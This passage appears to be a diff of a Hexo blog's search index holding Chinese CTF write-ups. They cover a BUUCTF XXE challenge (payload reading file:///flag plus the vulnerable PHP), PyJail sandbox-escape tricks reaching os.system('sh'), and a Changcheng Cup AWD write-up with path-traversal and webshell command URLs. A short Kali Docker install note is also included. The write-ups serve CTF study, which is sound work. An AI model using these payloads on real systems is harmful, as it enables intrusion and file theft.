class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有 admin 密码了也没用<br>藏内网了，上次比赛 ssrf 题出过</p>
+<ul>
+<li>etc&#x2F;hosts</li>
+<li>proc&#x2F;net&#x2F;arp<br><img src= "/img/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li>
+</ul>
 ]]></content>
       <categories>
-        <category>资源</category>
+        <category>web</category>
       </categories>
       <tags>
-        <tag>visual studio 2022</tag>
+        <tag>web</tag>
+        <tag>xxe</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PyJail python沙箱逃逸探究</title>
+    <url>/2023/07/PyJail%20python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%8E%A2%E7%A9%B6/</url>
+    <content><![CDATA[<h2 id="python-特性"><a href="#python-特性" class="headerlink" title="python 特性"></a>python 特性</h2><p>在 python 中，类均继承自<code>object</code>基类；</p>
+<h3 id="python-魔术方法"><a href="#python-魔术方法" class="headerlink" title="python 魔术方法"></a>python 魔术方法</h3><ul>
+<li><code>__init__</code>：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。</li>
+<li><code>__len__</code>：返回对象的长度。</li>
+<li><code>__str__</code>：返回对象的字符串表示。对一个对象<code>a</code>使用<code>str(a)</code>时，会尝试调用<code>a.__str__()</code>。相似地，还有<code>__int__</code>魔术方法也用于类型转换，不过较少使用。</li>
+<li><code>__getitem__</code>：根据索引返回对象的某个元素。对一个对象<code>a</code>使用<code>a[1]</code>时，会尝试调用<code>a.__getitem__(1)</code>。</li>
+<li><code>__add__</code>、<code>__sub__</code>、<code>__mul__</code>、<code>__div__</code>、<code>__mod__</code>：算术运算，加减乘除模。如对一个对象<code>a</code>使用<code>a+b</code>时，会尝试调用<code>a.__add__(b)</code>。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现<code>__radd__</code>、<code>__rsub__</code>、<code>__rmul__</code>、<code>__rdiv__</code>、<code>__rmod__</code>，如椭圆曲线上的点的倍点运算<code>G -&gt; d * G</code>，就可以通过实现<code>__rmul__</code>来实现。</li>
+<li><code>__and__</code>，<code>__or__</code>、<code>__xor__</code>：逻辑运算，和算术运算类似；</li>
+<li><code>__eq__</code>，<code>__ne__</code>、<code>__lt__</code>、<code>__gt__</code>、<code>__le__</code>、<code>__ge__</code>：比较运算，和算术运算类似；例如<code>&#39;贵州&#39; &gt; &#39;广西&#39;</code>，就会转而调用<code>&#39;贵州&#39;.__gt__(&#39;广西&#39;)</code>；</li>
+<li><code>__getattr__</code>：对象是否含有某属性。如果我们对对象<code>a</code>所对应的类实现了该方法，那么在调用未实现的<code>a.b</code>时，就会转而调用<code>a.__getattr__(b)</code>。这也等价于用函数的方法调用：<code>getattr(a, &#39;b&#39;)</code>。有<code>__getattr__</code>，自然也有对应的<code>__setattr__</code>；</li>
+<li><code>__subclasses__</code>：返回当前类的所有子类。一般是用在<code>object</code>类中，在<code>object.__subclasses__()</code>中，我们可以找到<code>os</code>模块中的类，然后再找到<code>os</code>，并且执行<code>os.system</code>，实现 RCE。</li>
+</ul>
+<h3 id="python-魔术属性"><a href="#python-魔术属性" class="headerlink" title="python 魔术属性"></a>python 魔术属性</h3><ul>
+<li><p><code>__dict__</code>：可以查看内部所有属性名和属性值组成的字典。</p>
+</li>
+<li><p><code>__doc__</code>：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。</p>
+</li>
+<li><p><code>__class__</code>：返回当前对象所属的类。如<code>&#39;&#39;.__class__</code>会返回<code>&lt;class &#39;str&#39;&gt;</code>。拿到类之后，就可以通过构造函数生成新的对象，如<code>&#39;&#39;.__class__(4396)</code>，就等价于<code>str(4396)</code>，即<code>&#39;4396&#39;</code>；</p>
+</li>
+<li><p><code>__base__</code>：返回当前类的基类。如<code>str.__base__</code>会返回<code>&lt;class &#39;object&#39;&gt;</code>；</p>
+</li>
+</ul>
+<h3 id="其他内置函数和变量"><a href="#其他内置函数和变量" class="headerlink" title="其他内置函数和变量"></a>其他内置函数和变量</h3><ul>
+<li><code>dir</code>：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过<code>getattr</code>来拿到目标方法。</li>
+<li><code>chr</code>、<code>ord</code>：字符与 ASCII 码转换函数，能帮我们绕过一些 WAF</li>
+<li><code>globals</code>：返回所有全局变量的函数；</li>
+<li><code>locals</code>：返回所有局部变量的函数；</li>
+<li><code>__import__</code>：载入模块的函数。例如<code>import os</code>等价于<code>os = __import__(&#39;os&#39;)</code>；</li>
+<li><code>__name__</code>：该变量指示当前运行环境位于哪个模块中。如我们 python 一般写的<code>if __name__ == &#39;__main__&#39;:</code>，就是来判断是否是直接运行该脚本。如果是从另外的地方 import 的该脚本的话，那<code>__name__</code>就不为<code>__main__</code>，就不会执行之后的代码。更多参考<a href="https://link.zhihu.com/?target=https://www.geeksforgeeks.org/__name__-a-special-variable-in-python/">这里</a>；</li>
+<li><code>__builtins__</code>：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。在 pyjail 的沙箱中，往往<code>__builtins__</code>被置为<code>None</code>，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到<code>__builtins__</code>，再<code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>进行 RCE；</li>
+<li><code>__file__</code>：该变量指示当前运行代码所在路径。如<code>open(__file__).read()</code>就是读取当前运行的 python 文件代码。需要注意的是，<strong>该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量</strong>；</li>
+<li><code>_</code>：该变量返回上一次运行的 python 语句结果。需要注意的是，<strong>该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量</strong>。</li>
+</ul>
+<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h3><p>使用<code>pop</code>、<code>__getitem__</code> 代替</p>
+<p>例如：<code>a.__getitem__(0)</code>、<code>&#123;&quot;a&quot;: 1&#125;.pop(&quot;a&quot;)</code></p>
+<p>或使用 next 等指针指向(类似无参 RCE 特殊函数遍历)</p>
+<p>需要去别的是 python 需要使用迭代器<code>iter(object[, sentinel])</code>作为传入函数</p>
+<h3 id="过滤字符"><a href="#过滤字符" class="headerlink" title="过滤字符"></a>过滤字符</h3><h6 id="chr-函数构造字符"><a href="#chr-函数构造字符" class="headerlink" title="chr() 函数构造字符"></a><code>chr()</code> 函数构造字符</h6><h4 id="利用输出"><a href="#利用输出" class="headerlink" title="利用输出"></a>利用输出</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span>(().__class__.__new__)[i]+……</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="built_in">print</span>(<span class="built_in">str</span>(().__class__.__new__))</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x00007FFF01FE8AB0</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤数字"><a href="#过滤数字" class="headerlink" title="过滤数字"></a>过滤数字</h3><ul>
+<li>0：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code>、<code>any(())</code></li>
+<li>1：<code>int(bool([&quot;&quot;]))</code>、<code>True</code>、<code>all(())</code>、<code>int(list(list(dict(a၁=())).pop()).pop())</code></li>
+<li>len：len(str({}.keys))</li>
+<li>1.0：<code>float(True)</code></li>
+<li>-1：<code>~0</code></li>
+</ul>
+<h3 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h3><p>str 被过滤<code>type(&#39;&#39;)()</code>、<code>format()</code> 即可。同理，<code>int</code>、<code>list</code> 都可以用 <code>type</code> 构造出来。</p>
+<h3 id="Non-ASCII-Identifiers"><a href="#Non-ASCII-Identifiers" class="headerlink" title="Non-ASCII Identifiers"></a>Non-ASCII Identifiers</h3><p>在 python3 中支持 Non-ASCII Identifies 并且所有都会被转换成 unicode 的 NFKC（也就是标准模式）。我们可以用斜体或者花体各种各样的与标准字母相像的来进行导包操作。</p>
+<blockquote>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://zhuanlan.zhihu.com/p/578966149">PyJail python 沙箱逃逸探究·总览</a></p>
+<p><a href="http://twe1v3.top/2023/02/pyjail-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E3%80%90CV%E3%80%91/#more">pyjail-学习总结【CV】 | TWe1v3</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>python</tag>
+        <tag>沙箱逃逸</tag>
+        <tag>PyJail</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024 长城杯铁人三项半决赛第二赛区 wp</title>
+    <url>/2024/05/awdwp/</url>
+    <content><![CDATA[<h2 id="CFS"><a href="#CFS" class="headerlink" title="CFS"></a>CFS</h2><h4 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h4><p>备份文件泄露</p>
+<p>下载后是流量包</p>
+<p>流量包存在明文 flag</p>
+<p>（这里可能是非预期，预期是 aes 破解到 test 密码后，有个页面有个 flag）</p>
+<p><img src= "/./img/image-20240421174259759.png" alt="image-20240421174259759"></p>
+<h4 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h4><p>流量里还有一个 flag.zip</p>
+<p>导出后</p>
+<p>爆破得密码为 123456</p>
+<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>存在 rce 查看解析目录后 echo 一句话木马进去</p>
+<p>连接后 cat &#x2F;flag 啥啥啥.txt</p>
+<p>flag get</p>
+<p><img src= "/./img/image-20240421175236.png" alt="屏幕截图 2024-04-21 175236"></p>
+<h2 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h2><p>题目附件备份：</p>
+<p><a href="./files/web.7z">php</a></p>
+<p><a href="./files/jsp.7z">java1</a></p>
+<p><a href="./files/java.7z">java2</a></p>
+<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>hook 流量发现一个 php 路径穿越</p>
+<p><code>/frontend/ajax/getfile?file=../../../../../../flag.txt</code></p>
+<p>修复：</p>
+<p>将&#x2F;和.等用于路径穿越的字符过滤置空</p>
+<p><img src= "/./img/image-20240421182144415.png" alt="image-20240421182144415"></p>
+<h4 id="java1"><a href="#java1" class="headerlink" title="java1"></a>java1</h4><p>一个 java</p>
+<p><code>/forget.jsp?cmd1=cat+/flag.txt</code></p>
+<p>修复 把 cmd1 字段改成复杂密码 使攻击者无法连接</p>
+<p><img src= "/./img/image-20240421182841159.png" alt="image-20240421182841159"></p>
+]]></content>
+      <categories>
+        <category>awd</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+        <tag>长城杯</tag>
+        <tag>铁人三项</tag>
       </tags>
   </entry>
   <entry>
@@ -460,99 +529,6 @@
         <tag>web</tag>
         <tag>ctfhub</tag>
         <tag>rce</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xxe</title>
-    <url>/2023/07/XXE/</url>
-    <content><![CDATA[<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>发现输入的 username 被 alert 了<br>查源码</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">onclick = <span class="string">&quot;XMLFunction()&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254264857-190.png" alt="在这里插入图片描述">抓包看 xml 格式<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254267429-193.png" alt="在这里插入图片描述">回来看控制台<br>发现 js 的 xml 应用</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">XMLFunction</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;root&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;username&gt;&#x27;</span> + $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/username&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;password&gt;&#x27;</span> + $(<span class="string">&#x27;#password&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/password&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;/root&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">readyState</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">                    <span class="title function_">alert</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;login.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">            xmlhttp.<span class="title function_">send</span>(xml);</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>构造 xxe 攻击<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254269819-196.png" alt="在这里插入图片描述">这是 post 包<code>传的时候记得把注释删去</code></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span>&lt;!--构造实体--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="comment">&lt;!--输出flag实体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
-<p><img src= "/img/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src= "/img/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>有 admin 密码了也没用<br>藏内网了，上次比赛 ssrf 题出过</p>
-<ul>
-<li>etc&#x2F;hosts</li>
-<li>proc&#x2F;net&#x2F;arp<br><img src= "/img/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li>
-</ul>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xxe</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024 长城杯铁人三项半决赛第二赛区 wp</title>
-    <url>/2024/05/awdwp/</url>
-    <content><![CDATA[<h2 id="CFS"><a href="#CFS" class="headerlink" title="CFS"></a>CFS</h2><h4 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h4><p>备份文件泄露</p>
-<p>下载后是流量包</p>
-<p>流量包存在明文 flag</p>
-<p>（这里可能是非预期，预期是 aes 破解到 test 密码后，有个页面有个 flag）</p>
-<p><img src= "/./img/image-20240421174259759.png" alt="image-20240421174259759"></p>
-<h4 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h4><p>流量里还有一个 flag.zip</p>
-<p>导出后</p>
-<p>爆破得密码为 123456</p>
-<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>存在 rce 查看解析目录后 echo 一句话木马进去</p>
-<p>连接后 cat &#x2F;flag 啥啥啥.txt</p>
-<p>flag get</p>
-<p><img src= "/./img/image-20240421175236.png" alt="屏幕截图 2024-04-21 175236"></p>
-<h2 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h2><p>题目附件备份：</p>
-<p><a href="./files/web.7z">php</a></p>
-<p><a href="./files/jsp.7z">java1</a></p>
-<p><a href="./files/java.7z">java2</a></p>
-<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>hook 流量发现一个 php 路径穿越</p>
-<p><code>/frontend/ajax/getfile?file=../../../../../../flag.txt</code></p>
-<p>修复：</p>
-<p>将&#x2F;和.等用于路径穿越的字符过滤置空</p>
-<p><img src= "/./img/image-20240421182144415.png" alt="image-20240421182144415"></p>
-<h4 id="java1"><a href="#java1" class="headerlink" title="java1"></a>java1</h4><p>一个 java</p>
-<p><code>/forget.jsp?cmd1=cat+/flag.txt</code></p>
-<p>修复 把 cmd1 字段改成复杂密码 使攻击者无法连接</p>
-<p><img src= "/./img/image-20240421182841159.png" alt="image-20240421182841159"></p>
-]]></content>
-      <categories>
-        <category>awd</category>
-      </categories>
-      <tags>
-        <tag>awd</tag>
-        <tag>长城杯</tag>
-        <tag>铁人三项</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali安装docker</title>
-    <url>/2023/07/docker/</url>
-    <content><![CDATA[<h2 id="kali-安装-docker"><a href="#kali-安装-docker" class="headerlink" title="kali 安装 docker"></a>kali 安装 docker</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install docker-engine</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 安装结束，打开docker服务</span></span></span><br><span class="line">service docker start</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 验证安装，运行测试样例</span></span></span><br><span class="line">docker --version</span><br><span class="line">docker run hello-world</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker --version</span><br><span class="line">docker images</span><br><span class="line">docker ps -a</span><br><span class="line">docker run -d --name 123 -p 127.0.0.1:80:80 镜像名</span><br><span class="line">docker stop 123</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.runoob.com/docker/docker-command-manual.html">其他常用命令见菜鸟教程</a></p>
-<h2 id="dockers-底层原理"><a href="#dockers-底层原理" class="headerlink" title="dockers 底层原理"></a>dockers 底层原理</h2><h3 id="Namespaces"><a href="#Namespaces" class="headerlink" title="Namespaces"></a>Namespaces</h3><blockquote>
-<p>命名空间是 Linux 为我们提供的<code>用于分离进程树、网络接口、挂载点以及进程间通信等资源</code>的方法。在日常使用 Linux 时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。</p>
-</blockquote>
-<h3 id="CGroups"><a href="#CGroups" class="headerlink" title="CGroups"></a>CGroups</h3><blockquote>
-<p>我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们<code>提供物理资源上的隔离</code>，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。<br>如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I&#x2F;O 和网络带宽。<br><code>在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。</code></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>kali</tag>
-        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -646,6 +622,30 @@
       <tags>
         <tag>web</tag>
         <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali安装docker</title>
+    <url>/2023/07/docker/</url>
+    <content><![CDATA[<h2 id="kali-安装-docker"><a href="#kali-安装-docker" class="headerlink" title="kali 安装 docker"></a>kali 安装 docker</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install docker-engine</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 安装结束，打开docker服务</span></span></span><br><span class="line">service docker start</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 验证安装，运行测试样例</span></span></span><br><span class="line">docker --version</span><br><span class="line">docker run hello-world</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker --version</span><br><span class="line">docker images</span><br><span class="line">docker ps -a</span><br><span class="line">docker run -d --name 123 -p 127.0.0.1:80:80 镜像名</span><br><span class="line">docker stop 123</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.runoob.com/docker/docker-command-manual.html">其他常用命令见菜鸟教程</a></p>
+<h2 id="dockers-底层原理"><a href="#dockers-底层原理" class="headerlink" title="dockers 底层原理"></a>dockers 底层原理</h2><h3 id="Namespaces"><a href="#Namespaces" class="headerlink" title="Namespaces"></a>Namespaces</h3><blockquote>
+<p>命名空间是 Linux 为我们提供的<code>用于分离进程树、网络接口、挂载点以及进程间通信等资源</code>的方法。在日常使用 Linux 时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。</p>
+</blockquote>
+<h3 id="CGroups"><a href="#CGroups" class="headerlink" title="CGroups"></a>CGroups</h3><blockquote>
+<p>我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们<code>提供物理资源上的隔离</code>，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。<br>如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I&#x2F;O 和网络带宽。<br><code>在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。</code></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>web</category>
